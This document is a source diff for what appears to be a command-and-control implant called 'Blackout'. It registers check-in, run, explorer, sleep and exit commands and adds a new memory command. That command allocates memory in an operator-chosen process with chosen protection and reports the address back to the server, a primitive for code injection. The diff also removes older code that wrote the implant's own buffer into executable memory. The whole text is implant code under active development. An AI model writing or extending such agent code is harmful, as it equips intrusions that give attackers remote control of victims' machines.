@@ -6,11 +6,12 @@ FUNC VOID CommandDispatcher(
     BLACKOUT_INSTANCE
 
     Instance()->Commands[ 0 ] = { .ID = BLACKOUT_CHECKIN, .Function = CommandCheckin };
-    Instance()->Commands[ 1 ] = { .ID = COMMAND_RUN,      .Function = CommandRun };
-    Instance()->Commands[ 2 ] = { .ID = COMMAND_EXPLORER, .Function = CommandExplorer };
-    Instance()->Commands[ 3 ] = { .ID = COMMAND_SLEEP,    .Function = CommandSleep };
-    Instance()->Commands[ 4 ] = { .ID = COMMAND_EXITP,    .Function = CommandExitProcess };
-    Instance()->Commands[ 5 ] = { .ID = COMMAND_EXITT,    .Function = CommandExitThread };
+    Instance()->Commands[ 1 ] = { .ID = COMMAND_MEMORY,   .Function = CommandMemory };
+    Instance()->Commands[ 2 ] = { .ID = COMMAND_RUN,      .Function = CommandRun };
+    Instance()->Commands[ 3 ] = { .ID = COMMAND_EXPLORER, .Function = CommandExplorer };
+    Instance()->Commands[ 4 ] = { .ID = COMMAND_SLEEP,    .Function = CommandSleep };
+    Instance()->Commands[ 5 ] = { .ID = COMMAND_EXITP,    .Function = CommandExitProcess };
+    Instance()->Commands[ 6 ] = { .ID = COMMAND_EXITT,    .Function = CommandExitThread };
 
     PPACKAGE Package     = NULL;
     PARSER   Parser      = { 0 };
@@ -45,7 +46,7 @@ FUNC VOID CommandDispatcher(
                     BOOL FoundCommand = FALSE;
                     for ( UINT32 FunctionCounter = 0; FunctionCounter < BLACKOUT_COMMAND_LENGTH; FunctionCounter++ )
                     {
-                        BK_PRINT( "Task => CommandID:[%lu : %lx]\n", TaskCommand, Instance()->Commands[ FunctionCounter ].ID );
+                        BK_PRINT( "Task => CommandID:[%lu : %lu]\n", TaskCommand, Instance()->Commands[ FunctionCounter ].ID );
                         if ( Instance()->Commands[ FunctionCounter ].ID == TaskCommand )
                         {
                             Instance()->Commands[ FunctionCounter ].Function( &Parser );
@@ -81,20 +82,37 @@ FUNC VOID CommandDispatcher(
 FUNC VOID CommandMemory( 
     _In_ PPARSER Parser    
 ) {
-    BLACKOUT_INSTANCE
+    MEM MemOp = ParserGetInt32( Parser );
+    
+    BK_PACKAGE = PackageCreate( COMMAND_MEMORY );
+    
+    switch ( MemOp )
+    {
+    case ALLOC: {
 
-    PVOID BaseAddr = NULL;
-    DWORD AddrSize = 0x2000;
-    DWORD ErrCode  = 0;
+        HANDLE ProcessHandle = ParserGetInt32( Parser );
+        PVOID  BaseAddr      = ParserGetInt32( Parser );
+        UINT64 RegionSize    = ParserGetInt64( Parser );
+        DWORD  Protection    = ParserGetInt32( Parser );
+        DWORD  Err           = 0;
+        
+        Err = bkMemAlloc( ProcessHandle, &BaseAddr, RegionSize, 0x3000, Protection );
+        if ( Err != 0 ) {
+            PackageTransmitError( Err );
+            return;
+        }
 
-    ErrCode = bkMemAlloc( NULL, &BaseAddr, AddrSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
+        BK_PRINT( "%llx\n", CST_U64( BaseAddr ) );
 
-    ErrCode = bkMemWrite( NULL, BaseAddr, Instance()->Base.Buffer, 0x1000 );
-
-    ErrCode = bkMemProtect( NULL, BaseAddr, AddrSize, PAGE_READWRITE );
-
-    BK_PRINT( "[I] Base Addr @ 0x%p\n", BaseAddr );
-    BK_PRINT( "[!] Error code: %d\n", ErrCode );
+        PackageAddInt64( BK_PACKAGE, CST_U64( BaseAddr ) );
+        PackageTransmit( BK_PACKAGE, NULL, NULL );  
+        return;          
+    }
+        break;
+    
+    default:
+        break;
+    }
 }
 
 FUNC VOID CommandRun(
